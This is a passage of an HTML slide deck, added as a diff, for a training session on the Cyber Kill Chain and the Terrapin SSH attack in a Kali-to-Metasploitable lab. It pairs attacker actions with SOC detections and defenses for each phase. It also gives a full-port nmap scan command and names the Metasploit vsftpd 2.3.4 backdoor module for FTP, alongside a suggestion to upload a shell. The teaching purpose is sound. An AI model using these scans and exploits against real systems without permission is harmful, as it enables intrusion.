@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Day 2 – Cyber Kill Chain & Terrapin Attack</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg:#010a0e;--border:#0d3545;--accent:#00ffe7;--accent2:#ff3c6e;
+    --accent3:#f0c040;--dim:#0a2530;--text:#c8e8f0;--muted:#4a7a8a;
+    --green:#00ff88;--purple:#b060ff;
+  }
+  *{margin:0;padding:0;box-sizing:border-box;}
+  html{scroll-behavior:smooth;}
+  body{background:var(--bg);color:var(--text);font-family:'Rajdhani',sans-serif;overflow-x:hidden;}
+  body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,231,0.012) 2px,rgba(0,255,231,0.012) 4px);pointer-events:none;z-index:9999;}
+  .grid-bg{position:fixed;inset:0;background-image:linear-gradient(rgba(0,255,231,0.03) 1px,transparent 1px),linear-gradient(90deg,rgba(0,255,231,0.03) 1px,transparent 1px);background-size:40px 40px;z-index:0;pointer-events:none;}
+  .orb{position:fixed;border-radius:50%;filter:blur(120px);pointer-events:none;z-index:0;}
+  .orb1{width:600px;height:600px;background:rgba(0,255,231,0.05);top:-150px;left:-150px;}
+  .orb2{width:500px;height:500px;background:rgba(255,60,110,0.04);bottom:200px;right:-150px;}
+  .orb3{width:400px;height:400px;background:rgba(176,96,255,0.03);bottom:-100px;left:30%;}
+
+  /* PROGRESS */
+  .progress-bar{position:fixed;top:0;left:0;right:0;height:3px;z-index:600;}
+  .progress-fill{height:100%;width:0%;background:linear-gradient(90deg,var(--accent),var(--purple),var(--accent2));box-shadow:0 0 12px var(--accent);transition:width .1s linear;}
+
+  /* TOPBAR */
+  .topbar{position:sticky;top:0;z-index:500;display:flex;justify-content:space-between;align-items:center;padding:11px 40px;border-bottom:1px solid var(--border);background:rgba(1,10,14,0.96);backdrop-filter:blur(12px);}
+  .topbar-left{font-family:'Share Tech Mono';color:var(--muted);font-size:12px;}
+  .topbar-left span{color:var(--accent);}
+  .topbar-center{font-family:'Orbitron';font-size:11px;color:var(--accent);letter-spacing:3px;}
+  .topbar-right{font-family:'Share Tech Mono';color:var(--muted);font-size:12px;}
+  .topbar-right span{color:var(--accent3);}
+
+  /* SCROLL CONTAINER */
+  .scroll-container{position:relative;z-index:10;max-width:1200px;margin:0 auto;padding:0 48px 100px;}
+
+  /* SECTIONS */
+  .section{padding:64px 0 20px;position:relative;}
+  .section+.section{border-top:1px solid var(--border);}
+
+  /* REVEAL ANIMATION */
+  .reveal{opacity:0;transform:translateY(28px);transition:opacity .6s ease,transform .6s ease;}
+  .reveal.visible{opacity:1;transform:translateY(0);}
+
+  /* TYPOGRAPHY */
+  .slide-tag{font-family:'Share Tech Mono';font-size:11px;color:var(--accent);letter-spacing:3px;text-transform:uppercase;margin-bottom:10px;display:flex;align-items:center;gap:10px;}
+  .slide-tag::before{content:'';width:24px;height:1px;background:var(--accent);display:inline-block;}
+  h1{font-family:'Orbitron';font-size:clamp(32px,5vw,58px);font-weight:900;line-height:1.05;color:#fff;text-shadow:0 0 50px rgba(0,255,231,0.25);}
+  h1 .hl{color:var(--accent);}
+  h2{font-family:'Orbitron';font-size:clamp(20px,2.8vw,30px);font-weight:700;color:#fff;margin-bottom:24px;}
+  h2 .hl{color:var(--accent);}h2 .hl2{color:var(--accent2);}h2 .hl3{color:var(--accent3);}
+  .subtitle{font-size:18px;color:var(--muted);margin-top:14px;font-weight:300;letter-spacing:.5px;max-width:680px;line-height:1.6;}
+
+  /* GRIDS */
+  .grid-2{display:grid;grid-template-columns:1fr 1fr;gap:16px;}
+  .grid-3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:14px;}
+
+  /* ── TABLET (≤900px) ── */
+  @media(max-width:900px){
+    .grid-3{grid-template-columns:1fr 1fr;}
+    .phase-grid{grid-template-columns:repeat(4,1fr);}
+    .scroll-container{padding:0 28px 80px;}
+    .hero{min-height:auto;padding:60px 0 40px;}
+    .hero-deco{display:none;}
+    .kpi-row{flex-wrap:wrap;}
+    .kpi-box{min-width:calc(50% - 8px);}
+    .port-desc{margin-left:0;width:100%;}
+  }
+
+  /* ── MOBILE (≤600px) ── */
+  @media(max-width:600px){
+    .topbar{padding:10px 16px;}
+    .topbar-center{display:none;}
+    .topbar-right{display:none;}
+    .scroll-container{padding:0 16px 60px;}
+    .section{padding:40px 0 16px;}
+    .grid-2,.grid-3{grid-template-columns:1fr;}
+    .phase-grid{grid-template-columns:repeat(2,1fr);}
+    h1{font-size:clamp(26px,8vw,40px);}
+    h2{font-size:clamp(17px,5vw,22px);margin-bottom:16px;}
+    .subtitle{font-size:15px;}
+    .hero{padding:40px 0 32px;}
+    .meta-row{gap:14px;}
+    .kc-chain{gap:0;}
+    .kc-step{min-width:44px;}
+    .kc-num{font-size:14px;}
+    .kc-name{font-size:7px;letter-spacing:0;}
+    .kc-arrow{right:-8px;border-top-width:8px;border-bottom-width:8px;border-left-width:8px;}
+    .kc-step-inner{padding:10px 2px 8px;}
+    .panel{padding:14px 16px;}
+    .phase-card{padding:12px 14px;}
+    .code-block{font-size:11px;padding:12px 14px;line-height:1.7;}
+    .compare-table{font-size:12px;}
+    .compare-table th,.compare-table td{padding:7px 10px;}
+    .kpi-box{min-width:calc(50% - 8px);padding:14px 10px;}
+    .kpi-val{font-size:24px;}
+    .port-row{gap:8px;padding:9px 12px;}
+    .port-badge{font-size:11px;}
+    .port-phase{font-size:12px;}
+    .port-desc{font-size:11px;margin-left:0;width:100%;}
+    .big-quote{font-size:15px;padding:14px 16px;}
+    .alert-box{padding:12px 14px;font-size:13px;}
+    .flow-step{padding:9px 12px;}
+    .flow-step .step-title{font-size:13px;}
+    .slide-tag{font-size:10px;letter-spacing:2px;}
+    ul.list li{font-size:14px;}
+  }
+
+  /* PANELS */
+  .panel{background:rgba(4,15,20,0.75);border:1px solid var(--border);border-radius:4px;padding:20px 24px;position:relative;overflow:hidden;}
+  .panel::before{content:'';position:absolute;top:0;left:0;width:3px;height:100%;background:var(--accent);}
+  .panel.red::before{background:var(--accent2);}
+  .panel.gold::before{background:var(--accent3);}
+  .panel.green::before{background:var(--green);}
+  .panel-title{font-family:'Share Tech Mono';font-size:11px;color:var(--accent);letter-spacing:2px;margin-bottom:14px;text-transform:uppercase;}
+  .panel.red .panel-title{color:var(--accent2);}
+  .panel.gold .panel-title{color:var(--accent3);}
+  .panel.green .panel-title{color:var(--green);}
+
+  /* LISTS */
+  ul.list{list-style:none;display:flex;flex-direction:column;gap:9px;}
+  ul.list li{display:flex;align-items:flex-start;gap:10px;font-size:15px;color:var(--text);line-height:1.5;}
+  ul.list li::before{content:'›';color:var(--accent);font-size:18px;line-height:1.2;flex-shrink:0;}
+  ul.list.red li::before{color:var(--accent2);}
+  ul.list.gold li::before{color:var(--accent3);}
+  ul.list.green li::before{color:var(--green);}
+
+  /* BADGES */
+  .badge{display:inline-flex;align-items:center;gap:6px;font-family:'Share Tech Mono';font-size:11px;padding:4px 12px;border-radius:2px;letter-spacing:1px;}
+  .badge.red{background:rgba(255,60,110,0.15);border:1px solid rgba(255,60,110,0.4);color:var(--accent2);}
+  .badge.cyan{background:rgba(0,255,231,0.1);border:1px solid rgba(0,255,231,0.3);color:var(--accent);}
+  .badge.gold{background:rgba(240,192,64,0.1);border:1px solid rgba(240,192,64,0.3);color:var(--accent3);}
+  .tag-pill{display:inline-block;padding:3px 12px;border:1px solid var(--accent);color:var(--accent);font-family:'Share Tech Mono';font-size:11px;border-radius:2px;letter-spacing:1px;}
+  .tag-pill.gold{border-color:var(--accent3);color:var(--accent3);}
+
+  /* HERO */
+  .hero{min-height:88vh;display:flex;flex-direction:column;justify-content:center;position:relative;padding:80px 0 60px;}
+  .hero-deco{position:absolute;right:-40px;top:50%;transform:translateY(-50%);opacity:.08;pointer-events:none;}
+  .meta-row{display:flex;gap:24px;margin-top:28px;flex-wrap:wrap;}
+  .meta-item{display:flex;flex-direction:column;gap:3px;}
+  .meta-label{font-family:'Share Tech Mono';font-size:10px;color:var(--muted);letter-spacing:2px;}
+  .meta-value{font-size:15px;font-weight:600;color:var(--text);}
+
+  /* KILL CHAIN BAR */
+  .kc-chain{display:flex;align-items:stretch;gap:0;margin:24px 0;overflow-x:auto;}
+  .kc-step{flex:1;min-width:85px;display:flex;flex-direction:column;align-items:center;text-align:center;position:relative;cursor:default;transition:transform .2s;}
+  .kc-step:hover{transform:translateY(-4px);}
+  .kc-step-inner{width:100%;padding:14px 6px 10px;background:var(--dim);border:1px solid var(--border);border-right:none;position:relative;}
+  .kc-step:last-child .kc-step-inner{border-right:1px solid var(--border);}
+  .kc-step.active .kc-step-inner{background:rgba(0,255,231,0.08);border-color:var(--accent);}
+  .kc-num{font-family:'Orbitron';font-size:22px;font-weight:900;color:var(--muted);line-height:1;}
+  .kc-name{font-family:'Share Tech Mono';font-size:9px;letter-spacing:1px;color:var(--muted);text-transform:uppercase;margin-top:6px;line-height:1.3;}
+  .kc-step.active .kc-num{color:var(--accent);text-shadow:0 0 20px var(--accent);}
+  .kc-step.active .kc-name{color:var(--text);}
+  .kc-arrow{position:absolute;right:-10px;top:50%;transform:translateY(-50%);width:0;height:0;border-top:12px solid transparent;border-bottom:12px solid transparent;border-left:10px solid var(--border);z-index:2;}
+  .kc-step.active .kc-arrow{border-left-color:var(--accent);}
+  .kc-step:last-child .kc-arrow{display:none;}
+
+  /* PHASE CARDS */
+  .phase-card{background:rgba(4,15,20,0.8);border:1px solid;border-radius:4px;padding:16px 18px;}
+  .phase-card.attacker{border-color:rgba(255,60,110,0.4);}
+  .phase-card.soc{border-color:rgba(0,255,231,0.4);}
+  .phase-card.defense{border-color:rgba(0,255,136,0.4);}
+  .phase-card-title{font-family:'Share Tech Mono';font-size:10px;letter-spacing:2px;text-transform:uppercase;margin-bottom:12px;padding-bottom:8px;border-bottom:1px solid var(--border);}
+  .phase-card.attacker .phase-card-title{color:var(--accent2);}
+  .phase-card.soc .phase-card-title{color:var(--accent);}
+  .phase-card.defense .phase-card-title{color:var(--green);}
+
+  /* PHASE OVERVIEW GRID */
+  .phase-grid{display:grid;grid-template-columns:repeat(7,1fr);gap:10px;margin-top:20px;}
+  .phase-tile{background:var(--dim);border:1px solid var(--border);border-radius:3px;padding:16px 8px;text-align:center;transition:all .3s;position:relative;overflow:hidden;}
+  .phase-tile::before{content:'';position:absolute;bottom:0;left:0;right:0;height:2px;}
+  .phase-tile:nth-child(1)::before{background:#00bfff;}
+  .phase-tile:nth-child(2)::before{background:#8060ff;}
+  .phase-tile:nth-child(3)::before{background:#ff8c00;}
+  .phase-tile:nth-child(4)::before{background:var(--accent2);}
+  .phase-tile:nth-child(5)::before{background:#ff4444;}
+  .phase-tile:nth-child(6)::before{background:var(--green);}
+  .phase-tile:nth-child(7)::before{background:var(--accent3);}
+  .phase-tile:hover{transform:translateY(-4px);box-shadow:0 8px 24px rgba(0,0,0,0.5);border-color:var(--accent);}
+  .phase-tile-num{font-family:'Orbitron';font-size:26px;font-weight:900;color:var(--muted);line-height:1;}
+  .phase-tile-name{font-family:'Share Tech Mono';font-size:9px;letter-spacing:.5px;color:var(--muted);margin-top:6px;text-transform:uppercase;line-height:1.3;}
+
+  /* PORT ROWS */
+  .port-row{display:flex;align-items:center;gap:12px;padding:11px 16px;background:var(--dim);border:1px solid var(--border);border-radius:3px;margin-bottom:10px;flex-wrap:wrap;}
+  .port-badge{font-family:'Share Tech Mono';font-size:13px;color:var(--accent3);background:rgba(240,192,64,0.1);border:1px solid rgba(240,192,64,0.3);padding:3px 10px;border-radius:2px;white-space:nowrap;}
+  .port-service{font-family:'Share Tech Mono';font-size:12px;color:var(--muted);}
+  .port-arrow{color:var(--accent2);font-size:14px;}
+  .port-phase{font-size:13px;color:var(--text);font-weight:600;}
+  .port-desc{font-size:12px;color:var(--muted);margin-left:auto;font-style:italic;}
+
+  /* CODE BLOCK */
+  .code-block{background:#000;border:1px solid var(--border);border-radius:3px;padding:16px 20px;font-family:'Share Tech Mono';font-size:12.5px;color:#88ff88;line-height:2;overflow-x:auto;}
+  .code-block .prompt{color:var(--accent2);}
+  .code-block .cmd{color:var(--accent);}
+  .code-block .comment{color:var(--muted);}
+  .code-block .success{color:var(--green);}
+  .code-block .attack{color:var(--accent2);}
+  .code-block .info{color:var(--accent3);}
+
+  /* COMPARE TABLE */
+  .compare-table{width:100%;border-collapse:collapse;font-size:14px;}
+  .compare-table th{background:var(--dim);border:1px solid var(--border);padding:10px 14px;font-family:'Share Tech Mono';font-size:11px;letter-spacing:2px;text-align:left;color:var(--accent);}
+  .compare-table th:nth-child(2){color:var(--accent2);}
+  .compare-table td{border:1px solid var(--border);padding:9px 14px;color:var(--text);vertical-align:top;}
+  .compare-table tr:nth-child(even) td{background:rgba(255,255,255,0.02);}
+  .compare-table td:first-child{font-weight:600;color:var(--accent3);font-family:'Share Tech Mono';font-size:12px;}
+
+  /* FLOW STEPS */
+  .flow-step{display:flex;align-items:center;gap:12px;padding:11px 16px;border:1px solid var(--border);background:var(--dim);border-radius:3px;margin-bottom:9px;}
+  .flow-step .step-num{font-family:'Orbitron';font-size:20px;color:var(--accent2);min-width:32px;}
+  .flow-step .step-title{font-weight:700;font-size:15px;color:#fff;}
+  .flow-step .step-desc{font-size:12px;color:var(--muted);margin-top:2px;}
+  .flow-step.attack-step{border-color:rgba(255,60,110,0.4);background:rgba(255,60,110,0.05);}
+
+  /* ALERTS */
+  .alert-box{background:rgba(255,60,110,0.08);border:1px solid rgba(255,60,110,0.4);border-radius:3px;padding:14px 18px;display:flex;align-items:flex-start;gap:12px;font-size:14px;line-height:1.6;}
+  .alert-box.info{background:rgba(0,255,231,0.06);border-color:rgba(0,255,231,0.3);}
+  .alert-box.success{background:rgba(0,255,136,0.06);border-color:rgba(0,255,136,0.3);}
+  .alert-icon{font-size:18px;flex-shrink:0;margin-top:1px;}
+
+  /* KPI ROW */
+  .kpi-row{display:flex;gap:16px;flex-wrap:wrap;}
+  .kpi-box{flex:1;min-width:120px;background:var(--dim);border:1px solid var(--border);border-radius:3px;padding:20px 16px;text-align:center;}
+  .kpi-val{font-family:'Orbitron';font-size:32px;font-weight:900;color:var(--accent);line-height:1;}
+  .kpi-label{font-family:'Share Tech Mono';font-size:10px;color:var(--muted);letter-spacing:2px;margin-top:8px;}
+
+  /* BIG QUOTE */
+  .big-quote{font-family:'Rajdhani';font-size:clamp(17px,2vw,22px);font-weight:600;line-height:1.7;color:var(--text);padding:20px 24px;border-left:3px solid var(--accent);background:rgba(0,255,231,0.04);border-radius:0 4px 4px 0;}
+
+  /* UTILITIES */
+  .mt-16{margin-top:16px;}.mt-20{margin-top:20px;}.mt-24{margin-top:24px;}
+  .flex-col{display:flex;flex-direction:column;gap:12px;}
+</style>
+</head>
+<body>
+<div class="grid-bg"></div>
+<div class="orb orb1"></div><div class="orb orb2"></div><div class="orb orb3"></div>
+<div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+
+<div class="topbar">
+  <div class="topbar-left">SESSION <span>DAY-02</span> // TEAM-A</div>
+  <div class="topbar-center">◈ CYBER KILL CHAIN ◈</div>
+  <div class="topbar-right">CVE-2023-48795 <span>ACTIVE</span></div>
+</div>
+
+<div class="scroll-container">
+
+  <!-- HERO -->
+  <div class="hero reveal">
+    <div class="hero-deco">
+      <svg width="420" height="420" viewBox="0 0 200 200">
+        <path d="M100 10 L190 45 L190 100 Q190 160 100 190 Q10 160 10 100 L10 45 Z" fill="none" stroke="#00ffe7" stroke-width="2"/>
+        <path d="M100 30 L170 58 L170 100 Q170 148 100 172 Q30 148 30 100 L30 58 Z" fill="none" stroke="#00ffe7" stroke-width="1" opacity="0.5"/>
+        <circle cx="100" cy="100" r="30" fill="none" stroke="#00ffe7" stroke-width="1.5"/>
+        <line x1="100" y1="55" x2="100" y2="145" stroke="#00ffe7" stroke-width="1"/>
+        <line x1="55" y1="100" x2="145" y2="100" stroke="#00ffe7" stroke-width="1"/>
+        <circle cx="100" cy="100" r="60" fill="none" stroke="#00ffe7" stroke-width="0.5" opacity="0.3"/>
+        <circle cx="100" cy="100" r="90" fill="none" stroke="#00ffe7" stroke-width="0.3" opacity="0.15"/>
+      </svg>
+    </div>
+    <div class="slide-tag">LOCKHEED MARTIN FRAMEWORK // DAY 2</div>
+    <h1>CYBER<br><span class="hl">KILL CHAIN</span><br>& Terrapin Attack</h1>
+    <p class="subtitle">Mapping reconnaissance to attack lifecycle · SOC detection · CVE-2023-48795</p>
+    <div class="meta-row">
+      <div class="meta-item"><div class="meta-label">TEAM</div><div class="meta-value">Team-A</div></div>
+      <div class="meta-item"><div class="meta-label">FRAMEWORK</div><div class="meta-value">Kill Chain + MITRE ATT&CK</div></div>
+      <div class="meta-item"><div class="meta-label">LAB ENV</div><div class="meta-value">Kali → Metasploitable</div></div>
+      <div class="meta-item"><div class="meta-label">CVE</div><div class="meta-value" style="color:var(--accent2)">2023-48795</div></div>
+    </div>
+    <div style="margin-top:32px;display:flex;gap:10px;flex-wrap:wrap;">
+      <span class="badge cyan">7 PHASES COVERED</span>
+      <span class="badge red">TERRAPIN EXPLOIT</span>
+      <span class="badge gold">SOC DETECTION</span>
+    </div>
+  </div>
+
+  <!-- AGENDA -->
+  <div class="section reveal">
+    <div class="slide-tag">SESSION OVERVIEW</div>
+    <h2>Today's <span class="hl">Agenda</span></h2>
+    <div class="grid-2">
+      <div class="flex-col">
+        <div class="panel"><div class="panel-title">PART 1 — KILL CHAIN</div><ul class="list"><li>Lockheed Martin framework origin & purpose</li><li>7 phases: what attackers do at each stage</li><li>SOC detection opportunities per phase</li><li>Defensive controls & where to break the chain</li></ul></div>
+        <div class="panel gold"><div class="panel-title">PART 2 — DAY-1 MAPPING</div><ul class="list gold"><li>Nmap scan → Reconnaissance phase</li><li>Port 21/22/80/443 → Attack path analysis</li><li>Exploitation vectors per discovered service</li></ul></div>
+      </div>
+      <div class="flex-col">
+        <div class="panel red"><div class="panel-title">PENDING TASKS</div><ul class="list red"><li>Terrapin Attack (CVE-2023-48795)</li><li>Auto payload recommendation in Metasploit</li><li>Blind Shell vs Reverse Shell – when to use</li></ul></div>
+        <div class="panel green"><div class="panel-title">DELIVERABLES</div><ul class="list green"><li>Kill Chain explanation with examples</li><li>Recon-to-lifecycle mapping table</li><li>Defensive controls per phase</li><li>SOC detection discussion summary</li></ul></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- KILL CHAIN INTRO -->
+  <div class="section reveal">
+    <div class="slide-tag">PART 1 — FRAMEWORK OVERVIEW</div>
+    <h2>The <span class="hl">Cyber Kill Chain</span> — Origin</h2>
+    <div class="grid-2 mt-16">
+      <div class="panel"><div class="panel-title">WHAT IS IT?</div><ul class="list"><li>Developed by <strong>Lockheed Martin in 2011</strong></li><li>Adapted from the military "kill chain" concept</li><li>Describes structured stages of a cyber attack</li><li>Used by SOC analysts and threat hunters globally</li></ul></div>
+      <div class="panel gold"><div class="panel-title">PURPOSE</div><ul class="list gold"><li>Model how attackers plan and execute attacks</li><li>Identify detection/prevention opportunities</li><li>Break the attack before data loss occurs</li><li>Structure incident response analysis</li></ul></div>
+    </div>
+    <div class="phase-grid">
+      <div class="phase-tile"><div class="phase-tile-num">01</div><div class="phase-tile-name">Reconnaissance</div></div>
+      <div class="phase-tile"><div class="phase-tile-num">02</div><div class="phase-tile-name">Weaponization</div></div>
+      <div class="phase-tile"><div class="phase-tile-num">03</div><div class="phase-tile-name">Delivery</div></div>
+      <div class="phase-tile"><div class="phase-tile-num">04</div><div class="phase-tile-name">Exploitation</div></div>
+      <div class="phase-tile"><div class="phase-tile-num">05</div><div class="phase-tile-name">Installation</div></div>
+      <div class="phase-tile"><div class="phase-tile-num">06</div><div class="phase-tile-name">Command &amp; Control</div></div>
+      <div class="phase-tile"><div class="phase-tile-num">07</div><div class="phase-tile-name">Actions on Obj.</div></div>
+    </div>
+    <div class="alert-box info mt-20"><div class="alert-icon">ℹ</div><div>Breaking the chain at any phase prevents the attacker from reaching their ultimate objective. Earlier breaks are more cost-effective and less disruptive.</div></div>
+  </div>
+
+  <!-- PHASE 1 & 2 -->
+  <div class="section reveal">
+    <div class="slide-tag">PHASES 1 &amp; 2</div>
+    <h2><span class="hl">Reconnaissance</span> &amp; <span style="color:var(--purple)">Weaponization</span></h2>
+    <div class="kc-chain">
+      <div class="kc-step active"><div class="kc-step-inner"><div class="kc-num">01</div><div class="kc-name">Recon-naissance</div><div class="kc-arrow"></div></div></div>
+      <div class="kc-step active"><div class="kc-step-inner"><div class="kc-num">02</div><div class="kc-name">Weapon-ization</div><div class="kc-arrow"></div></div></div>
+      <div class="kc-step"><div class="kc-step-inner"><div class="kc-num">03</div><div class="kc-name">Delivery</div><div class="kc-arrow"></div></div></div>
+      <div class="kc-step"><div class="kc-step-inner"><div class="kc-num">04</div><div class="kc-name">Exploitation</div><div class="kc-arrow"></div></div></div>
+      <div class="kc-step"><div class="kc-step-inner"><div class="kc-num">05</div><div class="kc-name">Installation</div><div class="kc-arrow"></div></div></div>
+      <div class="kc-step"><div class="kc-step-inner"><div class="kc-num">06</div><div class="kc-name">C2</div><div class="kc-arrow"></div></div></div>
+      <div class="kc-step"><div class="kc-step-inner"><div class="kc-num">07</div><div class="kc-name">Actions</div></div></div>
+    </div>
+    <div class="grid-2">
+      <div class="flex-col">
+        <div class="phase-card attacker"><div class="phase-card-title">⚔ PHASE 1 — ATTACKER ACTIONS</div><ul class="list red"><li>OSINT — email harvesting, LinkedIn, job postings</li><li>Network scanning with Nmap, Masscan</li><li>Passive recon via Shodan, DNS lookups, WHOIS</li></ul></div>
+        <div class="phase-card soc"><div class="phase-card-title">◉ SOC DETECTIONS</div><ul class="list"><li>Repeated port scan alerts from IDS/IPS</li><li>Suspicious enumeration behavior patterns</li></ul></div>
+        <div class="phase-card defense"><div class="phase-card-title">🛡 DEFENSES</div><ul class="list green"><li>Firewall rules · IDS/IPS · Minimize public attack surface</li></ul></div>
+      </div>
+      <div class="flex-col">
+        <div class="phase-card attacker"><div class="phase-card-title">⚔ PHASE 2 — ATTACKER ACTIONS</div><ul class="list red"><li>Creates malware, exploits, payload packages</li><li>Malicious macro documents / backdoor implants</li><li>Sets up Command &amp; Control (C2) infrastructure</li></ul></div>
+        <div class="phase-card soc"><div class="phase-card-title">◉ SOC DETECTIONS</div><ul class="list"><li>Suspicious file hashes via threat intel feeds</li><li>Malware signature detections in sandboxes</li></ul></div>
+        <div class="phase-card defense"><div class="phase-card-title">🛡 DEFENSES</div><ul class="list green"><li>AV/EDR solutions · Email sandboxing · Threat hunting</li></ul></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- PHASE 3 & 4 -->
+  <div class="section reveal">
+    <div class="slide-tag">PHASES 3 &amp; 4</div>
+    <h2><span class="hl2">Delivery</span> &amp; <span class="hl3">Exploitation</span></h2>
+    <div class="kc-chain">
+      <div class="kc-step"><div class="kc-step-inner"><div class="kc-num">01</div><div class="kc-name">Recon</div><div class="kc-arrow"></div></div></div>
+      <div class="kc-step"><div class="kc-step-inner"><div class="kc-num">02</div><div class="kc-name">Weaponize</div><div class="kc-arrow"></div></div></div>
+      <div class="kc-step active"><div class="kc-step-inner"><div class="kc-num">03</div><div class="kc-name">Delivery</div><div class="kc-arrow"></div></div></div>
+      <div class="kc-step active"><div class="kc-step-inner"><div class="kc-num">04</div><div class="kc-name">Exploitation</div><div class="kc-arrow"></div></div></div>
+      <div class="kc-step"><div class="kc-step-inner"><div class="kc-num">05</div><div class="kc-name">Install</div><div class="kc-arrow"></div></div></div>
+      <div class="kc-step"><div class="kc-step-inner"><div class="kc-num">06</div><div class="kc-name">C2</div><div class="kc-arrow"></div></div></div>
+      <div class="kc-step"><div class="kc-step-inner"><div class="kc-num">07</div><div class="kc-name">Actions</div></div></div>
+    </div>
+    <div class="grid-2">
+      <div class="flex-col">
+        <div class="phase-card attacker"><div class="phase-card-title">⚔ PHASE 3 — DELIVERY</div><ul class="list red"><li>Spearphishing emails with malicious attachments</li><li>USB drop attacks on-site</li><li>Watering hole attacks on trusted websites</li></ul></div>
+        <div class="phase-card soc"><div class="phase-card-title">◉ SOC DETECTIONS</div><ul class="list"><li>Suspicious email logs and attachment analysis</li><li>DNS anomalies and malicious domain access</li></ul></div>
+        <div class="phase-card defense"><div class="phase-card-title">🛡 DEFENSES</div><ul class="list green"><li>Email filtering · Web filtering · Security awareness training</li></ul></div>
+      </div>
+      <div class="flex-col">
+        <div class="phase-card attacker"><div class="phase-card-title">⚔ PHASE 4 — EXPLOITATION</div><ul class="list red"><li>Exploits known CVEs or zero-day vulnerabilities</li><li>Triggers malicious macros inside documents</li><li>Privilege escalation post initial access</li></ul></div>
+        <div class="phase-card soc"><div class="phase-card-title">◉ SOC DETECTIONS</div><ul class="list"><li>Abnormal process spawning (e.g. Word → cmd.exe)</li><li>Application crash logs / privilege escalation attempts</li></ul></div>
+        <div class="phase-card defense"><div class="phase-card-title">🛡 DEFENSES</div><ul class="list green"><li>Patch management · Vulnerability scanning · App control policies</li></ul></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- PHASE 5 6 7 -->
+  <div class="section reveal">
+    <div class="slide-tag">PHASES 5, 6 &amp; 7</div>
+    <h2>Installation · <span class="hl">C2</span> · <span class="hl2">Actions on Objectives</span></h2>
+    <div class="kc-chain">
+      <div class="kc-step"><div class="kc-step-inner"><div class="kc-num">01</div><div class="kc-name">Recon</div><div class="kc-arrow"></div></div></div>
+      <div class="kc-step"><div class="kc-step-inner"><div class="kc-num">02</div><div class="kc-name">Weaponize</div><div class="kc-arrow"></div></div></div>
+      <div class="kc-step"><div class="kc-step-inner"><div class="kc-num">03</div><div class="kc-name">Delivery</div><div class="kc-arrow"></div></div></div>
+      <div class="kc-step"><div class="kc-step-inner"><div class="kc-num">04</div><div class="kc-name">Exploit</div><div class="kc-arrow"></div></div></div>
+      <div class="kc-step active"><div class="kc-step-inner"><div class="kc-num">05</div><div class="kc-name">Installation</div><div class="kc-arrow"></div></div></div>
+      <div class="kc-step active"><div class="kc-step-inner"><div class="kc-num">06</div><div class="kc-name">C2</div><div class="kc-arrow"></div></div></div>
+      <div class="kc-step active"><div class="kc-step-inner"><div class="kc-num">07</div><div class="kc-name">Actions</div></div></div>
+    </div>
+    <div class="grid-3">
+      <div class="flex-col">
+        <div class="phase-card" style="border-color:rgba(255,68,68,0.4)"><div class="phase-card-title" style="color:#ff4444">⚔ INSTALLATION</div><ul class="list red"><li>Backdoors / web shells deployed</li><li>Registry run keys modified for persistence</li><li>Timestomping to hide file changes</li></ul></div>
+        <div class="phase-card soc"><div class="phase-card-title">◉ DETECT</div><ul class="list"><li>New service creation logs</li><li>Sysmon / registry modification monitoring</li></ul></div>
+        <div class="phase-card defense"><div class="phase-card-title">🛡 DEFEND</div><ul class="list green"><li>EDR · Sysmon · File integrity monitoring</li></ul></div>
+      </div>
+      <div class="flex-col">
+        <div class="phase-card soc" style="border-color:rgba(0,255,136,0.4)"><div class="phase-card-title" style="color:var(--green)">⚔ C2 CHANNEL</div><ul class="list"><li>HTTP/HTTPS callback to remote server</li><li>DNS tunneling for covert channel</li><li>Periodic beaconing patterns</li></ul></div>
+        <div class="phase-card soc"><div class="phase-card-title">◉ DETECT</div><ul class="list"><li>Frequent DNS requests to unknown domains</li><li>Repeated beacon intervals in network logs</li></ul></div>
+        <div class="phase-card defense"><div class="phase-card-title">🛡 DEFEND</div><ul class="list green"><li>Network monitoring · DNS logging · Egress filtering</li></ul></div>
+      </div>
+      <div class="flex-col">
+        <div class="phase-card attacker"><div class="phase-card-title">⚔ ACTIONS ON OBJECTIVES</div><ul class="list red"><li>Credential harvesting across the network</li><li>Lateral movement via pass-the-hash</li><li>Data exfiltration / ransomware deployment</li><li>Delete Shadow Copies / destroy backups</li></ul></div>
+        <div class="phase-card soc"><div class="phase-card-title">◉ DETECT</div><ul class="list"><li>Large outbound data transfers to unknown IPs</li><li>Admin privilege abuse detected in SIEM</li></ul></div>
+        <div class="phase-card defense"><div class="phase-card-title">🛡 DEFEND</div><ul class="list green"><li>DLP · Strict access controls · Backup monitoring</li></ul></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- DAY-1 MAPPING -->
+  <div class="section reveal">
+    <div class="slide-tag">PART 2 — DAY-1 LAB MAPPING</div>
+    <h2>Nmap Recon → <span class="hl3">Kill Chain</span> Phases</h2>
+    <div class="panel mt-16"><div class="panel-title">NMAP SCAN CLASSIFICATION</div>
+      <div style="display:flex;align-items:center;gap:16px;flex-wrap:wrap;">
+        <span style="font-family:'Share Tech Mono';font-size:13px;color:var(--text)">nmap -sV -sC -p- 192.168.x.x</span>
+        <span style="color:var(--muted)">→</span>
+        <span class="tag-pill">PHASE 1: RECONNAISSANCE</span>
+        <span class="tag-pill gold">ACTIVE SCANNING</span>
+      </div>
+    </div>
+    <div class="mt-20">
+      <div class="port-row"><span class="port-badge">PORT 21</span><span class="port-service">FTP</span><span class="port-arrow">→</span><span class="port-phase">Exploitation (Brute Force / Anonymous Login)</span><span class="port-arrow">→</span><span class="port-phase" style="color:var(--green)">Installation (Upload shell)</span><div class="port-desc">vsftpd 2.3.4 backdoor — exploit/unix/ftp/vsftpd_234_backdoor</div></div>
